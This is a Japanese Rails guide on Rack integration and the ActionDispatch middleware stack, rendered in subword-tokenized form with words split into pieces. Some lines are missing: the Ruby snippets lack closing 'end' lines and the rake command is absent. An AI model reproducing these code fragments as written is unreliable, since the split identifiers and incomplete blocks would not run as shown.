▁ Rack に関する 解 説 はこの ガイド の 範 疇 を 超 え てしまいます 。
▁ Rack に関する 基本的な 知 識 が 足 らない 場合 、 下 記 の [ リソース ]( # 参 考 資 料 ) ▁ を参照してください 。
▁Rails と Rack
▁### ▁ Rack アプリケーション として の Rails アプリケーション
▁` Rails . application ` は Rails アプリケーションを Rack アプリケーション として 実装 した ものです 。
▁ Rack に 準 拠 した Web サーバー で 、 Rails アプリケーションを 提 供 するには 、` Rails . application ` オブジェクト を使用する 必要があります 。
▁### ▁` rails ▁ server `
▁` rails ▁ server ` コマンド は ` Rack :: S er ver ` の オブジェクト を作成し 、 ウ ェ ブ サーバー を 起動 します 。
▁` rails ▁ server ` コマンド は 以下のように して 、` Rack :: S er ver ` の オブジェクト を作成します 。
▁Rails :: S er ver . new . t a p ▁do ▁| server |
▁require ▁A P P _ P A T H
▁D ir . ch d ir ( Rails . application . root )
▁ server . start
▁` Rails :: S er ver ` クラス は ` Rack :: S er ver ` クラス を継承し ており 、 以下のように して ` Rack :: S er ver # start ` を呼び出します 。
▁class ▁S er ver ▁< ▁ :: Rack :: S er ver
▁def ▁ start
▁ s up er
▁また 次のように して 、 ミドルウェア を 読み込み ます 。
▁def ▁ middleware
▁ middleware s ▁= ▁[ ]
▁ middleware s ▁< < ▁[ Rails :: Rack :: D e b ug g er ] ▁if ▁ options [: debug g er ]
▁ middleware s ▁< < ▁[ :: Rack :: Content L en g th ]
▁ Hash . new ( middleware s )
▁` Rails :: Rack :: D e b ug g er ` は 主 として development 環境で 役 に 立 ち ます 。
▁ 読み込まれ た ミドルウェア の 役 割 は 下 表 の とおりです 。
▁| ▁ ミドルウェア ▁| ▁ 役 割 ▁|
▁| ▁- ----------- ----------- ▁| ▁- ---------------- ---------------- ---------------- ---------------- ---------------- ▁|
▁| ▁` Rails :: Rack :: D e b ug g er ` ▁| ▁ デ バ ッ ガ を 起動 する ▁|
▁Rails の ` rails ▁ server ` コマンド の代わりに ` rack up ` コマンド を使用する とき は 、 下 記 の内容 を ` config . r u ` に 記述 して 、 Rails アプリケーションの ルート ディレクトリ に保存 します 。
▁# ▁Rails . root / config . r u
▁require ▁ :: File . ex p and _ path (' . . / config / environment ', ▁ _ _ F I L E _ _ )
▁use ▁ Rack :: Content L en g th
▁run ▁Rails . application
▁ サーバー を 起動 します 。
▁$ ▁ rack up ▁config . r u
▁` rack up ` の オプション について 詳 しく 知りたい とき は 下 記 の ようにします 。
▁$ ▁ rack up ▁-- help
▁Action ▁D is patch er の ミドルウェアスタック
▁Action ▁D is patch er 内部 の コンポーネント の 多く は 、 Rack の ミドルウェア として 実装 されています 。
▁Rails 内 外 の 様 々 な ミドルウェア を 結合 して 、 完全な Rails の Rack アプリケーションを 作る ために 、` Rails :: Application ` は ` ActionDispatch :: M id d le w ar e S t ack ` を使用しています 。
▁NOT E : ▁` ActionDispatch :: M id d le w ar e S t ack ` は ` Rack :: B u il de r ` の Rails 版 ですが 、 Rails アプリケーションの 要求 を 満 た す ために 、 より 柔 軟 性 があり 、 多 機能 な クラス になっています 。
▁### ▁ ミドルウェアスタック を調べ る
▁Rails には ミドルウェアスタック を調べ るため の 便利な Rake タスク があります 。
▁作成した ば か り の Rails アプリケーション では 、 以下のように 出力 される はずです 。
▁use ▁ Rack :: S end file
▁use ▁ ActionDispatch :: S t a tic
▁use ▁ Rack :: L ock
▁use ▁#< ActiveSupport :: Cache :: S tr at e g y :: L o c al Cache :: M id d le w ar e : 0 x 0 000 000 2 9 a 08 3 8 >
▁use ▁ Rack :: R un time
▁use ▁ Rack :: M e th o d O ver ri de
▁use ▁ ActionDispatch :: Request I d
▁use ▁Rails :: Rack :: Logger
▁use ▁ ActionDispatch :: S h o w E x ce p tion s
▁use ▁ ActionDispatch :: D e b ug E x ce p tion s
▁use ▁ ActionDispatch :: Re m o te I p
▁use ▁ ActionDispatch :: Re load er
▁use ▁ ActionDispatch :: Callbacks
▁use ▁ActiveRecord :: Migration :: C h ec k P end ing
▁use ▁ActiveRecord :: Connection A d a p ter s :: Connection M an a gem ent
▁use ▁ActiveRecord :: Query Cache
▁use ▁ ActionDispatch :: Co o k ies
▁use ▁ ActionDispatch :: Session :: Co o k i e S to re
▁use ▁ ActionDispatch :: F la sh
▁use ▁ ActionDispatch :: P ar am s P ar s er
▁use ▁ Rack :: H e ad
▁use ▁ Rack :: Co n d i tion al G e t
▁use ▁ Rack :: E T a g
▁run ▁Rails . application . routes
▁ デフォルトの ミドルウェア ( と その他 のうち いくつか ) については ▁[ In ter n al ▁ M id d le w ar es ]( # ミドルウェアスタック の内容 ) ▁ を参照してください 。
▁### ▁ ミドルウェアスタック を設定する
▁ ミドルウェアスタック に ミドルウェア を追加した り 、 削除 したり 、 変更 したり するには ` application . rb ` も しく は 環境 ご と の ` environments / < environment > . rb ` ファイル 内で ` config . middleware ` を い じ ります 。
▁#### ▁ ミドルウェア を追加する
▁ 次の メソッドを使用すると 、 ミドルウェアスタック に 新しい ミドルウェア を追加する ことができます 。
▁* ▁` config . middleware . us e ( new _ middleware , ▁ ar g s ) ` ▁- ▁ ミドルウェアスタック の 一 番 下 に 新しい ミドルウェア を追加します 。
▁* ▁` config . middleware . in s er t _ before ( ex ist ing _ middleware , ▁ new _ middleware , ▁ ar g s ) ` ▁- ▁( 第 一 引数 で ) 指定された ミドルウェア の 前に 新しい ミドルウェア を追加します 。
▁* ▁` config . middleware . in s er t _ after ( ex ist ing _ middleware , ▁ new _ middleware , ▁ ar g s ) ` ▁- ▁( 第 一 引数 で ) 指定された ミドルウェア の 後に 新しい ミドルウェア を追加します 。
▁# ▁ Rack :: B o un ce F a v i con を 一 番 最後に 追加 する
▁config . middleware . us e ▁ Rack :: B o un ce F a v i con
▁# ▁また L if o :: Cache に { ▁ page _ cache : ▁false ▁ } を 渡す
▁config . middleware . in s er t _ after ▁ActiveRecord :: Query Cache , ▁ L if o :: Cache , ▁ page _ cache : ▁false
▁#### ▁ ミドルウェア を 交 換 する
▁` config . middleware . s w a p ` を使用することで 、 ミドルウェアスタック 内の ミドルウェア を 交 換 できます 。
▁# ▁ ActionDispatch :: S h o w E x ce p tion s を L if o :: S h o w E x ce p tion s で 置き換え る
▁config . middleware . s w a p ▁ ActionDispatch :: S h o w E x ce p tion s , ▁ L if o :: S h o w E x ce p tion s
▁#### ▁ ミドルウェア を削除する
▁ アプリケーションの 設定 に 、 下 記 のコード を追加し てください 。
▁config . middleware . delete ▁" Rack :: L ock "
▁ ミドルウェアスタック を調べ ると 、` Rack :: L ock ` が 消 え ている ことが 分 か ります 。
▁( in ▁ / Users / li f o / Rails / blog )
▁use ▁#< ActiveSupport :: Cache :: S tr at e g y :: L o c al Cache :: M id d le w ar e : 0 x 0 000 000 1 c 30 4 c 8 >
▁ セッション 関連 の ミドルウェア を削除し たい とき は 次のように 書き ます 。
▁config . middleware . delete ▁" ActionDispatch :: Co o k ies "
▁config . middleware . delete ▁" ActionDispatch :: Session :: Co o k i e S to re "
▁config . middleware . delete ▁" ActionDispatch :: F la sh "
▁ ブラウザ 関連 の ミドルウェア を削除する には 次のように 書き ます 。
▁### ▁ ミドルウェアスタック の内容
▁Action ▁ Controller の 機能 の 多く は ミドルウェア として 実装 されています 。
▁以下の リスト で それぞれの 役 割 を 説明します 。
▁* ▁X - S end file ▁ header を設定します 。
▁` config . action _ dispatch . x _ s end file _ header ` オプション 経由で 設定 を変更 できます 。
▁** ` ActionDispatch :: S t a tic ` **
▁* ▁` env [ " rack . m ulti th read "] ` を ` false ` に設定し 、 アプリケーションを M u t ex で 包 み ます 。
▁** ` ActiveSupport :: Cache :: S tr at e g y :: L o c al Cache :: M id d le w ar e ` **
▁* ▁ メモリ による キャッシュ を行う ために 使用します 。
▁この キャッシュ は ス レ ッ ド セ ー フ ではありません 。
▁** ` Rack :: R un time ` **
▁* ▁X - R un time ヘッダー を生成します 。 この ヘッダー には リクエスト の 処理 に か か った 時間 が 秒 単 位 で 表示 されます 。
▁** ` Rack :: M e th o d O ver ri de ` **
▁* ▁` params [: _ method ] ` が存在する ときに 、 ( HTTP の ) メソッドを 上 書き ます 。
▁ HTTP の PUT メソッド 、 DELETE メソッドを 実現 するための ミドルウェア です 。
▁** ` ActionDispatch :: Request I d ` **
▁* ▁ ユ ニ ー ク な id を生成し て ` X - Request - I d ` ヘッダー に設定し ます 。 ` ActionDispatch :: Request # u u id ` メソッド も 同 一 の id を 利用 しています 。
▁** ` Rails :: Rack :: Logger ` **
▁* ▁ リクエスト の 処理 を 開 始 した ことを 、 ログ に 書き 出 します 。
▁** ` ActionDispatch :: S h o w E x ce p tion s ` **
▁* ▁ アプリケーション が 返 して く る 例外 を 捕 え 、 例外 処理 用の アプリケーションを 起動 します 。 例外 処理 用の アプリケーション は 、 エ ンド ユーザー 向け に 例外 を 整 形 します 。
▁** ` ActionDispatch :: D e b ug E x ce p tion s ` **
▁* ▁ 例外 を ログ に 残 し 、 ローカル から の リクエスト の場合は 、 デバッグ 用の ページ を表示します 。
▁** ` ActionDispatch :: Re m o te I p ` **
▁* ▁I P ス プ ー フ ィ ング 攻撃 を チェック します 。
▁** ` ActionDispatch :: Re load er ` **
▁* ▁ development 環境で コードの 再 読み込み を行う ために 、 prepare コールバック と c le an up コールバック を提供します 。
▁** ` ActionDispatch :: Callbacks ` **
▁** ` ActiveRecord :: Migration :: C h ec k P end ing ` **
▁* ▁ 未 実行 の マイグレーション がない か 確認 します 。 未 実行 の もの が あった 場合は 、` ActiveRecord :: P end ing Migration Error ` を 発生 さ ます 。
▁** ` ActiveRecord :: Connection A d a p ter s :: Connection M an a gem ent ` **
▁* ▁ リクエストを 処理 する 度 に データベース への コ ネ ク ション を コ ネ ク ション プ ー ル に 返します 。 ` env [' rack . test '] ` ▁ が ▁` true ` で ない場合 のみ 返 却 が 行われます 。
▁** ` ActiveRecord :: Query Cache ` **
▁* ▁Active ▁Record の クエリ キャッシュ を有効に します 。
▁** ` ActionDispatch :: Co o k ies ` **
▁* ▁ ク ッ キー 機能 を提供します 。
▁** ` ActionDispatch :: Session :: Co o k i e S to re ` **
▁* ▁ ク ッ キー に セッション を保存する ようにします 。
▁** ` ActionDispatch :: F la sh ` **
▁* ▁ flash 機能 を提供します ( flash とは 連 続 する リクエスト 間 で 値を 共有 する 機能 です )。
▁** ` ActionDispatch :: P ar am s P ar s er ` **
▁* ▁ リクエスト から パラメータ を パ ー ス して 、` params ` を設定します 。
▁* ▁ H E A D リクエストを ` GET ` に変換 して 処理 します 。 その 上で body を 空 に した レスポンス を返します ( 訳 注 : ▁Rails 4 . 0 から は Rack :: H e ad を使う ように 変更 されています )。
▁** ` Rack :: Co n d i tion al G e t ` **
▁* ▁" 条件 付き ▁` GET ` " ▁( Co n d i tion al ▁` GET ` ) ▁ 機能 を提供します 。 " 条件 付き ▁` GET ` " が 有効 になっている と 、 リクエスト された ページに 変更 がない ときに 空 の body を返す ようになります 。
▁** ` Rack :: E T a g ` **
▁* ▁ body が 文字列 のみ の レスポンス に対して 、 E T a g ヘッダ を追加します 。
▁ E T a g は キャッシュ の 有効 性 を検証する の に 使用されます 。
▁ TIP : ▁これらの ミドルウェア は いずれ も 、 Rack の ミドルウェアスタック に 利用 できます 。
▁ 参 考 資 料
▁### ▁ Rack について 詳 しく 学ぶ
▁* ▁[ Rack 公式 サイト ]( http :// rack . github . io )
▁* ▁[ Rack 入 門 ]( http :// ch n e u k ir ch en . org / blog / ar ch ive / 200 7 / 0 2 / in tr o d u c ing - rack . html )
▁* ▁[ Ruby ▁on ▁ Rack ▁# 1 ▁- ▁ Hello ▁ Rack ! ](
▁* ▁[ Ruby ▁on ▁ Rack ▁# 2 ▁- ▁ The ▁B u il de r ]( http :// m . on key . org / ruby - on - rack - 2 - the - builder )
▁### ▁ ミドルウェア を理解する
▁* ▁[ Rails ca st ▁on ▁ Rack ▁ M id d le w ar es ]( http :// rails casts . com / e p is odes / 15 1 - rack - middleware )
